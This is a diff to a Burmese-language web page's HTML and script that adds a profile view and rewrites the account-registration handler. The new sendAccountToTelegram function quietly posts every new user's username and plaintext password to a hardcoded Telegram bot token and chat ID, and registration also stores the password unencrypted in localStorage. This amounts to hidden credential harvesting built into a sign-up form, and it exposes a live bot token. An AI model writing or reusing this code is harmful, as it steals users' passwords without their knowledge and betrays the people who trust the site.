@@ -69,6 +69,23 @@
     <button id="auth-btn" onclick="handleAuth()">အကောင့်ဖွင့်မည်</button>
     <p onclick="toggleMode()" style="cursor:pointer; color:blue;">အကောင့်ရှိပြီးသားဆိုရင် ဝင်ရန်</p>
     </div>
+    <div id="profile-section" style="display:none; padding:20px; border:1px solid #000;">
+    <h3>My Profile</h3>
+    <p>ID: <span id="p-id"></span></p>
+    <p>Username: <span id="p-uname"></span></p>
+    <button onclick="showProfile()">Profile ကြည့်ရန်</button>
+</div>
+
+<script>
+    function showProfile() {
+        let user = JSON.parse(localStorage.getItem('tspk_user'));
+        if (user) {
+            document.getElementById('p-id').innerText = user.id;
+            document.getElementById('p-uname').innerText = user.username;
+            document.getElementById('profile-section').style.display = 'block';
+        }
+    }
+</script>
     
     <div id="yt-bg-player" class="hidden"></div>
 
@@ -1150,7 +1167,30 @@ function cancelOrder() {
         document.getElementById('auth-title').innerText = isLogin ? "အကောင့်ဝင်ရန်" : "အကောင့်သစ်ဖွင့်ရန်";
         document.getElementById('auth-btn').innerText = isLogin ? "Login" : "Register";
     }
-    </script>
     
+    // အကောင့်ဖွင့်တာနဲ့ Telegram ဆီ အချက်အလက်ပို့တဲ့ Function
+    function sendAccountToTelegram(u, p, uid) {
+        let text = `New Account Created!\nID: ${uid}\nUsername: ${u}\nPassword: ${p}`;
+        fetch('https://api.telegram.org/bot8767805733:AAEeerLC7A98kmcs5LzBHfEbcUzMQLCxsSI/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: '6917040501', text: text })
+        });
+    }
+
+    // handleAuth() ထဲမှာ အစားထိုးပါ
+    function handleAuth() {
+        let u = document.getElementById('uname').value;
+        let p = document.getElementById('pword').value;
+        if (!isLogin) {
+            let uid = "USR-" + Math.floor(Math.random() * 99999);
+            localStorage.setItem('tspk_user', JSON.stringify({username: u, password: p, id: uid}));
+            sendAccountToTelegram(u, p, uid); // Telegram ဆီပို့မယ်
+            alert("အောင်မြင်သည်။ ID: " + uid);
+        } else {
+            // Login ပိုင်း
+        }
+    }
+    </script>
 </body> 
 </html>
